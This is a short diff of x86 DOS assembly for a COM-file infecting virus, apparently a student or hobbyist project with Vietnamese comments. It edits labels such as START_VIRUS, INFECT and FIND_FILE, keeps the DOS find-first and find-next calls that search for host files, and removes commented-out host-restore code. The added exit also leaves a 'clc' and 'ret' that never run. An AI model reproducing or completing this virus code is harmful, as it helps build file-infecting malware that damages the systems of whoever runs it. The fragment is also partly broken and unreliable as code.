@@ -16,12 +16,11 @@ DATA_ARRAY DB 0,0,0,0,0
 
 START_VIRUS:
     call INFECT                 ; return to host      
-     
+ 
     
 INFECT:    
     pop di   
     sub di,offset INFECT
-    call FIND_FILE 
 FIND_FILE:
 ;    push bp
 ;    sub sp,43H
@@ -29,7 +28,6 @@ FIND_FILE:
 ;    mov dx,bp
 ;    mov ah,1AH
 ;    int 21H           ; push doan DTA search len stack
-    
     mov ah,4EH
     lea dx,[di+OFFSET COM_FILE]
     int 21H     
@@ -92,19 +90,10 @@ CLOSE_FILE:
     int 21H         ;search for next file
     jmp FIND_LOOP  
          
-DONE:             
-;    mov ah,1AH
-;    mov dx,80H
-;    int 21H    
-;    mov si,OFFSET START
-;    add di,word ptr [di+DATA_ARRAY] 
-;    push si
-;    xchg si,di
-;    movsw
-;    movsw
-;    movsb     
+DONE:  
     mov     ax,4C00H
     int     21H
+    clc
     ret                          ; tra lai access cho host
         
     
